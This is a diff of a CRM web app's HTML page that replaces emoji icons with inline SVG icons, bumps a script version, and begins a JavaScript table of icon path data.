@@ -49,7 +49,7 @@
 <script type="module" src="src/config.js?v=2026-05-16-1"></script>
 <script type="module" src="src/shared/toast.js?v=2026-05-16-2"></script>
 <script type="module" src="src/shared/permissions.js?v=2026-05-16-3"></script>
-<script type="module" src="src/version-history.js?v=2026-05-29-6"></script>
+<script type="module" src="src/version-history.js?v=2026-05-29-7"></script>
 <script type="module" src="src/calendar/holidays.js?v=2026-05-16-5"></script>
 <script type="module" src="src/calendar/datepicker.js?v=2026-05-16-6"></script>
 <script type="module" src="src/calendar/index.js?v=2026-05-16-7"></script>
@@ -1371,7 +1371,7 @@ table th[onclick]{transition:background .15s,color .15s}
   <header class="topbar">
     <div class="topbar-title" id="page-title">Dashboard</div>
 
-    <button id="privacy-btn" class="privacy-btn" onclick="togglePrivacyMode()" title="Privacy Mode — hide sensitive info">🔒 Privacy</button>
+    <button id="privacy-btn" class="privacy-btn" onclick="togglePrivacyMode()" title="Privacy Mode — hide sensitive info"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> Privacy</button>
     <div style="margin-left:auto" id="topbar-call-widget">
       
       <div id="call-widget-idle">
@@ -1485,7 +1485,7 @@ table th[onclick]{transition:background .15s,color .15s}
     <div class="page active" id="page-dashboard">
       <div class="dash-header">
         <div>
-          <div class="sec-title" id="dash-greeting">Good morning 👋</div>
+          <div class="sec-title" id="dash-greeting">Good morning </div>
           <div style="font-size:12px;color:var(--text3);margin-top:2px">Your Next Level Marketing overview</div>
         </div>
         <button class="btn btn-sm" onclick="openDashboardEditor()" style="display:flex;align-items:center;gap:6px">
@@ -1655,7 +1655,7 @@ table th[onclick]{transition:background .15s,color .15s}
         </div>
         <!-- Empty state -->
         <div id="pl-empty-state" style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text3)">
-          <div style="font-size:36px;margin-bottom:12px">📊</div>
+          <div style="font-size:36px;margin-bottom:12px"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg></div>
           <div style="font-size:14px;font-weight:600;color:var(--text);margin-bottom:6px">Select a pipeline</div>
           <div style="font-size:12px">Click a pipeline on the left to view its deals</div>
         </div>
@@ -1772,7 +1772,7 @@ table th[onclick]{transition:background .15s,color .15s}
         
         <div class="builder-canvas" id="builder-canvas">
           <div class="builder-start-node">
-            <div class="bnode-icon">⚡</div>
+            <div class="bnode-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></div>
             <div class="bnode-label" id="trigger-label">Contact Created</div>
           </div>
           <div class="builder-connector"></div>
@@ -1792,7 +1792,7 @@ table th[onclick]{transition:background .15s,color .15s}
           <div style="font-size:12px;color:var(--text3);margin-top:2px">Review applicants and activate them for the matching pool</div>
         </div>
         <div style="display:flex;gap:8px;align-items:center">
-          <a href="/apply" target="_blank" class="btn btn-sm" style="font-size:12px;padding:6px 14px;background:var(--accent2);color:#fff;border-radius:8px;text-decoration:none">📋 Share Form</a>
+          <a href="/apply" target="_blank" class="btn btn-sm" style="font-size:12px;padding:6px 14px;background:var(--accent2);color:#fff;border-radius:8px;text-decoration:none"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg> Share Form</a>
         </div>
       </div>
       <div style="position:relative;max-width:280px;margin-bottom:12px">
@@ -1827,7 +1827,7 @@ table th[onclick]{transition:background .15s,color .15s}
           <div style="font-size:12px;color:var(--text3);margin-top:2px">Review client requirements and activate them for matching</div>
         </div>
         <div style="display:flex;gap:8px;align-items:center">
-          <a href="/client-intake" target="_blank" class="btn btn-sm" style="font-size:12px;padding:6px 14px;background:var(--accent2);color:#fff;border-radius:8px;text-decoration:none">📋 Share Form</a>
+          <a href="/client-intake" target="_blank" class="btn btn-sm" style="font-size:12px;padding:6px 14px;background:var(--accent2);color:#fff;border-radius:8px;text-decoration:none"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg> Share Form</a>
         </div>
       </div>
       <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;align-items:center">
@@ -2043,7 +2043,7 @@ table th[onclick]{transition:background .15s,color .15s}
 
         <div class="conv-thread-panel">
           <div id="conv-empty-state" class="conv-empty">
-            <div style="font-size:36px;margin-bottom:14px">💬</div>
+            <div style="font-size:36px;margin-bottom:14px"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></div>
             <div style="font-size:15px;font-weight:600;color:var(--text);margin-bottom:6px">Select a conversation</div>
             <div style="font-size:12px;color:var(--text3)">Pick a contact from the left to view their message history</div>
           </div>
@@ -2067,7 +2067,7 @@ table th[onclick]{transition:background .15s,color .15s}
                   <span id="conv-sms-count" style="font-size:11px;color:var(--text3)">0/160</span>
                   <div style="display:flex;gap:6px">
                     <button class="btn btn-sm" onclick="insertConvMerge('sms')">{{name}}</button>
-                    <button class="btn btn-sm" id="ai-draft-btn-sms" onclick="aiDraftReply('sms')" style="color:var(--accent2)">✨ AI Draft</button>
+                    <button class="btn btn-sm" id="ai-draft-btn-sms" onclick="aiDraftReply('sms')" style="color:var(--accent2)"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M12 2l2.4 7.4H22l-6.2 4.5 2.4 7.4-6.2-4.5-6.2 4.5 2.4-7.4L2 9.4h7.6z"/></svg> AI Draft</button>
                     <button class="btn btn-primary btn-sm" onclick="sendConvMessage('sms')">Send SMS</button>
                   </div>
                 </div>
@@ -2079,7 +2079,7 @@ table th[onclick]{transition:background .15s,color .15s}
                 <div class="conv-compose-footer">
                   <div style="display:flex;gap:6px">
                     <button class="btn btn-sm" onclick="insertConvMerge('email')">{{name}}</button>
-                    <button class="btn btn-sm" id="ai-draft-btn-email" onclick="aiDraftReply('email')" style="color:var(--accent2)">✨ AI Draft</button>
+                    <button class="btn btn-sm" id="ai-draft-btn-email" onclick="aiDraftReply('email')" style="color:var(--accent2)"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M12 2l2.4 7.4H22l-6.2 4.5 2.4 7.4-6.2-4.5-6.2 4.5 2.4-7.4L2 9.4h7.6z"/></svg> AI Draft</button>
                   </div>
                   <button class="btn btn-primary btn-sm" onclick="sendConvMessage('email')">Send Email</button>
                 </div>
@@ -2154,7 +2154,7 @@ table th[onclick]{transition:background .15s,color .15s}
 
         <div class="email-detail-panel">
           <div id="email-detail-empty" class="conv-empty">
-            <div style="font-size:32px;margin-bottom:12px">📧</div>
+            <div style="font-size:32px;margin-bottom:12px"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div>
             <div style="font-size:14px;font-weight:600;color:var(--text);margin-bottom:6px">Select an email</div>
             <div style="font-size:12px;color:var(--text3)">Pick an email to read it, or compose a new one</div>
           </div>
@@ -2198,8 +2198,8 @@ table th[onclick]{transition:background .15s,color .15s}
               <div class="form-group">
                 <label class="form-label">Type</label>
                 <select class="form-select" id="camp-type" onchange="updateCampTypeUI()">
-                  <option value="email">📧 Email</option>
-                  <option value="sms">📱 SMS</option>
+                  <option value="email"> Email</option>
+                  <option value="sms"> SMS</option>
                 </select>
               </div>
               <div class="form-group">
@@ -2403,7 +2403,7 @@ table th[onclick]{transition:background .15s,color .15s}
       <div class="int-section-title" style="display:inline-flex;align-items:center;gap:8px"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg> SMS &amp; Phone</div>
       <div class="int-full-card" id="int-card-signalwire">
         <div class="int-full-head" onclick="toggleIntSection('signalwire')">
-          <div class="int-full-icon" style="background:var(--red-bg)">📱</div>
+          <div class="int-full-icon" style="background:var(--red-bg)"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg></div>
           <div style="flex:1">
             <div class="int-full-name">SignalWire — SMS & Voice Calls</div>
             <div class="int-full-desc">Send SMS, make browser-based calls, and track replies from your contacts directly in the CRM</div>
@@ -2438,7 +2438,7 @@ table th[onclick]{transition:background .15s,color .15s}
       <div class="int-section-title" style="display:inline-flex;align-items:center;gap:8px"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg> Email Accounts</div>
       <div class="int-full-card" id="int-card-email">
         <div class="int-full-head" onclick="toggleIntSection('email')">
-          <div class="int-full-icon" style="background:var(--accent-bg)">📧</div>
+          <div class="int-full-icon" style="background:var(--accent-bg)"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div>
           <div style="flex:1">
             <div class="int-full-name">Email Accounts</div>
             <div class="int-full-desc">Connect multiple email accounts — send, receive, and track replies inside the CRM</div>
@@ -2455,7 +2455,7 @@ table th[onclick]{transition:background .15s,color .15s}
           <div id="int-email-accounts-list"></div>
 
           <div style="margin-top:14px;background:var(--amber-bg);border:1px solid rgba(255,184,48,.25);border-radius:var(--radius);padding:12px;font-size:12px;color:var(--amber);line-height:1.7">
-            <strong>📬 Receiving replies:</strong> Email replies land in your actual inbox. To pull them into the CRM, use the <strong>↻ Check Replies</strong> button in the Email section — it will import any Brevo inbound emails. For automatic syncing, set up Brevo's inbound parsing to forward replies to your webhook.
+            <strong><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg> Receiving replies:</strong> Email replies land in your actual inbox. To pull them into the CRM, use the <strong>↻ Check Replies</strong> button in the Email section — it will import any Brevo inbound emails. For automatic syncing, set up Brevo's inbound parsing to forward replies to your webhook.
           </div>
 
           <div style="margin-top:12px;border-top:1px solid var(--border);padding-top:12px">
@@ -2472,7 +2472,7 @@ table th[onclick]{transition:background .15s,color .15s}
       <div class="int-section-title" style="display:inline-flex;align-items:center;gap:8px"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg> Social Media</div>
       <div class="int-full-card" id="int-card-facebook">
         <div class="int-full-head" onclick="toggleIntSection('facebook')">
-          <div class="int-full-icon" style="background:var(--accent-bg)">📘</div>
+          <div class="int-full-icon" style="background:var(--accent-bg)"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg></div>
           <div style="flex:1">
             <div class="int-full-name">Facebook — Pages & Lead Ads</div>
             <div class="int-full-desc">Capture leads from Facebook Lead Ad forms automatically into your CRM contacts</div>
@@ -2503,7 +2503,7 @@ table th[onclick]{transition:background .15s,color .15s}
 
       <div class="int-full-card" id="int-card-instagram">
         <div class="int-full-head" onclick="toggleIntSection('instagram')">
-          <div class="int-full-icon" style="background:var(--pink-bg)">📸</div>
+          <div class="int-full-icon" style="background:var(--pink-bg)"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg></div>
           <div style="flex:1">
             <div class="int-full-name">Instagram — Business DMs</div>
             <div class="int-full-desc">Connect your Instagram Business account to manage DMs and capture leads from one inbox</div>
@@ -2529,7 +2529,7 @@ table th[onclick]{transition:background .15s,color .15s}
       <div class="int-section-title" style="display:inline-flex;align-items:center;gap:8px"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg> Calendar</div>
       <div class="int-full-card" id="int-card-calendar">
         <div class="int-full-head" onclick="toggleIntSection('calendar')">
-          <div class="int-full-icon" style="background:var(--green-bg)">📅</div>
+          <div class="int-full-icon" style="background:var(--green-bg)"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg></div>
           <div style="flex:1">
             <div class="int-full-name">Google Calendar</div>
             <div class="int-full-desc">Create and sync events directly into Google Calendar for you and your clients</div>
@@ -2554,13 +2554,13 @@ table th[onclick]{transition:background .15s,color .15s}
             </div>
             <div class="int-form-actions">
               <button class="btn" onclick="toggleIntSection('calendar')">Cancel</button>
-              <button class="btn btn-primary" onclick="gcalAuthorize()">🔐 Authorize with Google</button>
+              <button class="btn btn-primary" onclick="gcalAuthorize()"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> Authorize with Google</button>
             </div>
           </div>
 
           <div id="gcal-connected-panel" style="display:none">
             <div style="background:var(--green-bg);border:1px solid rgba(62,207,142,.25);border-radius:var(--radius);padding:12px;margin-bottom:16px;display:flex;align-items:center;gap:10px">
-              <span style="font-size:18px">✅</span>
+              <span style="font-size:18px"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><polyline points="20 6 9 17 4 12"/></svg></span>
               <div>
                 <div style="font-size:13px;font-weight:600;color:var(--green)">Google Calendar connected</div>
                 <div id="gcal-account-label" style="font-size:11px;color:var(--text3)"></div>
@@ -2568,7 +2568,7 @@ table th[onclick]{transition:background .15s,color .15s}
               <button class="btn btn-sm" style="margin-left:auto;color:var(--red)" onclick="gcalDisconnect()">Disconnect</button>
             </div>
             <div style="background:var(--accent-bg);border:1px solid var(--accent-border);border-radius:var(--radius);padding:12px;font-size:12px;color:var(--accent2);line-height:1.6">
-              📅 To create events and invite clients, go to the <strong>Calendar</strong> section and click <strong>+ New Event</strong>. All events sync directly to your Google Calendar.
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg> To create events and invite clients, go to the <strong>Calendar</strong> section and click <strong>+ New Event</strong>. All events sync directly to your Google Calendar.
             </div>
             
             <div style="margin-top:16px;border-top:1px solid var(--border);padding-top:14px">
@@ -2584,7 +2584,7 @@ table th[onclick]{transition:background .15s,color .15s}
       <div class="int-section-title" style="display:inline-flex;align-items:center;gap:8px"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg> Automation &amp; Webhooks</div>
       <div class="int-full-card" id="int-card-zapier">
         <div class="int-full-head" onclick="toggleIntSection('zapier')">
-          <div class="int-full-icon" style="background:var(--amber-bg)">🔗</div>
+          <div class="int-full-icon" style="background:var(--amber-bg)"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></div>
           <div style="flex:1">
             <div class="int-full-name">Zapier & Custom Webhooks</div>
             <div class="int-full-desc">Send contact and deal events to any app. Connect to 5,000+ tools via Zapier</div>
@@ -2773,8 +2773,8 @@ table th[onclick]{transition:background .15s,color .15s}
           </div>
 
           <div style="background:var(--accent-bg);border:1px solid var(--accent-border);border-radius:var(--radius);padding:12px;margin-bottom:14px;font-size:12px;color:var(--accent2);line-height:1.7">
-            💡 <strong>How to roll back:</strong> Open <a href="https://vercel.com/dashboard" target="_blank" style="color:var(--accent2);text-decoration:underline;font-weight:500">Vercel Dashboard</a> → your project → <strong>Deployments</strong> → find the commit hash below → click <strong>⋯</strong> → <strong>Promote to Production</strong>. Code reverts in seconds.
-            <br><br>📦 <strong>Your data is safe:</strong> rolling back changes the look/features, but contacts, deals, conversations, and call history stay intact in Supabase.
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><path d="M9 18h6"/><path d="M10 22h4"/><path d="M12 2a7 7 0 0 0-4 12.7c.6.5 1 1.3 1 2.1V18h6v-1.2c0-.8.4-1.6 1-2.1A7 7 0 0 0 12 2z"/></svg> <strong>How to roll back:</strong> Open <a href="https://vercel.com/dashboard" target="_blank" style="color:var(--accent2);text-decoration:underline;font-weight:500">Vercel Dashboard</a> → your project → <strong>Deployments</strong> → find the commit hash below → click <strong>⋯</strong> → <strong>Promote to Production</strong>. Code reverts in seconds.
+            <br><br><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0"><line x1="16.5" y1="9.4" x2="7.5" y2="4.21"/><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg> <strong>Your data is safe:</strong> rolling back changes the look/features, but contacts, deals, conversations, and call history stay intact in Supabase.
           </div>
 
           <div id="version-history-list" style="max-height:480px;overflow-y:auto"></div>
@@ -2913,6 +2913,63 @@ table th[onclick]{transition:background .15s,color .15s}
 <div class="toast" id="toast"><div class="toast-dot"></div><span id="toast-msg"></span></div>
 
 <script>
+// === ICON SET (inline stroke SVGs, currentColor, themeable) ===
+const ICON_PATHS = {
+  phone: '<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13.5a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.69h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 10.09a16 16 0 0 0 6 6l1.46-1.46a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/>',
+  smartphone: '<rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/>',
+  message: '<path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>',
+  mail: '<path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/>',
+  calendar: '<rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/>',
+  user: '<path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>',
+  users: '<path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75"/>',
+  tag: '<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/>',
+  chart: '<line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/>',
+  pencil: '<path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/>',
+  trash: '<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2"/>',
+  plus: '<line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>',
+  bolt: '<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>',
+  clock: '<circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>',
+  target: '<circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/>',
+  bulb: '<path d="M9 18h6"/><path d="M10 22h4"/><path d="M12 2a7 7 0 0 0-4 12.7c.6.5 1 1.3 1 2.1V18h6v-1.2c0-.8.4-1.6 1-2.1A7 7 0 0 0 12 2z"/>',
+  check: '<polyline points="20 6 9 17 4 12"/>',
+  x: '<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>',
+  link: '<path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>',
+  sparkle: '<path d="M12 2l2.4 7.4H22l-6.2 4.5 2.4 7.4-6.2-4.5-6.2 4.5 2.4-7.4L2 9.4h7.6z"/>',
+  clipboard: '<path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/>',
+  lock: '<rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
+  volume: '<polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/>',
+  mute: '<polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/>',
+  dollar: '<line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/>',
+  bot: '<rect x="3" y="11" width="18" height="10" rx="2"/><circle cx="12" cy="5" r="2"/><path d="M12 7v4"/><line x1="8" y1="16" x2="8" y2="16"/><line x1="16" y1="16" x2="16" y2="16"/>',
+  briefcase: '<rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/>',
+  rocket: '<path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"/><path d="M12 15l-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"/>',
+  refresh: '<polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>',
+  shuffle: '<polyline points="16 3 21 3 21 8"/><line x1="4" y1="20" x2="21" y2="3"/><polyline points="21 16 21 21 16 21"/><line x1="15" y1="15" x2="21" y2="21"/><line x1="4" y1="4" x2="9" y2="9"/>',
+  paperclip: '<path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/>',
+  search: '<circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>',
